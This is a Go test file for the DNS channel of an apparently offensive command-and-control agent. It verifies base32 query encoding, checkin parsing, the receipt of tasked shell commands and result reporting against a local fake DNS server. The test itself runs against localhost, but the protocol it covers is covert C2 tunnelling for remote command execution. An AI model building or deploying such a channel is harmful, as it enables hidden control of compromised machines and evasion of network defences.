package main

import (
	"encoding/base32"
	"encoding/binary"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/miekg/dns"
)

// DNS 信道测试：起一个假的 DNS 服务器（miekg/dns），按服务端 c2engine/dns.go 的
// 规则解析查询，验证 agent 侧的编码/解码与状态机。
//
// 覆盖点：
//  1. 查询名 = base32([8B agentID][消息]) + zone，且 agentID 正确落在前 8 字节；
//  2. checkin 响应 "ok:<id>:<interval>" 被正确解析；
//  3. task 响应 "task:<id>:<base32(cmd)>" 解出命令；
//  4. noop / 非法响应不会崩。

var dnsTestBase32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// fakeDNSServer 启动一个只回 TXT 的 UDP DNS 服务器，回调决定响应内容。
func fakeDNSServer(t *testing.T, reply func(msg string, agentID uint64) string) (addr string) {
	t.Helper()
	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen udp: %v", err)
	}
	srv := &dns.Server{
		PacketConn: pc,
		Handler: dns.HandlerFunc(func(w dns.ResponseWriter, r *dns.Msg) {
			m := new(dns.Msg)
			m.SetReply(r)
			m.RecursionAvailable = true
			if len(r.Question) == 1 && r.Question[0].Qtype == dns.TypeTXT {
				label := strings.Split(strings.ToLower(r.Question[0].Name), ".")[0]
				raw, derr := dnsTestBase32.DecodeString(strings.ToUpper(label))
				if derr == nil && len(raw) >= 8 {
					agentID := binary.BigEndian.Uint64(raw[:8])
					txt := reply(string(raw[8:]), agentID)
					if txt != "" {
						m.Answer = append(m.Answer, &dns.TXT{
							Hdr: dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
							Txt: []string{txt},
						})
					}
				}
			}
			_ = w.WriteMsg(m)
		}),
	}
	go func() { _ = srv.ActivateAndServe() }()
	t.Cleanup(func() { _ = srv.Shutdown() })
	return pc.LocalAddr().String()
}

// withDNSServer 临时把 DNSServer 指到测试服务器。
func withDNSServer(t *testing.T, addr string) {
	t.Helper()
	prev := DNSServer
	DNSServer = addr
	t.Cleanup(func() { DNSServer = prev })
}

func TestDNSCheckinAndTask(t *testing.T) {
	var gotCheckin string
	addr := fakeDNSServer(t, func(msg string, agentID uint64) string {
		switch {
		case strings.HasPrefix(msg, "checkin:"):
			gotCheckin = msg
			return "ok:7:10"
		case msg == "task":
			cmd := dnsTestBase32.EncodeToString([]byte("id"))
			return "task:42:" + cmd
		default:
			return "noop"
		}
	})
	withDNSServer(t, addr)

	prevID := clientID
	clientID = 0
	t.Cleanup(func() { clientID = prevID })

	tr := newDNSTransport("c2.test")
	tr.client.Timeout = 2 * time.Second

	cr, err := tr.Checkin()
	if err != nil {
		t.Fatalf("checkin: %v", err)
	}
	if cr.ClientID != 7 || cr.Interval != 10 {
		t.Fatalf("checkin resp = %+v", cr)
	}
	if clientID != 7 {
		t.Fatalf("clientID = %d, want 7", clientID)
	}
	if !strings.HasPrefix(gotCheckin, "checkin:") || !strings.Contains(gotCheckin, "|") {
		t.Fatalf("server saw checkin %q", gotCheckin)
	}

	tasks, err := tr.GetTasks()
	if err != nil {
		t.Fatalf("get tasks: %v", err)
	}
	if len(tasks) != 1 || tasks[0].ID != 42 || tasks[0].Command != "id" {
		t.Fatalf("tasks = %+v", tasks)
	}

	// 结果上报（服务器回 ack）。
	if err := tr.SendResult(42, "uid=0", "completed"); err != nil {
		t.Fatalf("send result: %v", err)
	}
}

func TestDNSNoopAndGarbage(t *testing.T) {
	addr := fakeDNSServer(t, func(msg string, agentID uint64) string {
		if msg == "task" {
			return "noop"
		}
		return "" // 空响应
	})
	withDNSServer(t, addr)

	tr := newDNSTransport("c2.test")
	tr.client.Timeout = 2 * time.Second
	tasks, err := tr.GetTasks()
	if err != nil {
		t.Fatalf("noop should not error: %v", err)
	}
	if len(tasks) != 0 {
		t.Fatalf("tasks = %+v, want none", tasks)
	}

	// checkin 收到非法响应必须报错（而不是当成成功）。
	if _, err := tr.Checkin(); err == nil {
		t.Fatalf("checkin with empty TXT should fail")
	}
}

// 服务端标签布局：前 8 字节是 agentID（大端），其后才是消息本体。
func TestDNSLabelLayout(t *testing.T) {
	var seenID uint64
	addr := fakeDNSServer(t, func(msg string, agentID uint64) string {
		seenID = agentID
		return "noop"
	})
	withDNSServer(t, addr)

	prevID := clientID
	clientID = 123456789
	t.Cleanup(func() { clientID = prevID })

	tr := newDNSTransport("c2.test")
	tr.client.Timeout = 2 * time.Second
	if _, err := tr.query(clientID, "task"); err != nil {
		t.Fatalf("query: %v", err)
	}
	if seenID != 123456789 {
		t.Fatalf("server saw agentID %d, want 123456789", seenID)
	}
}
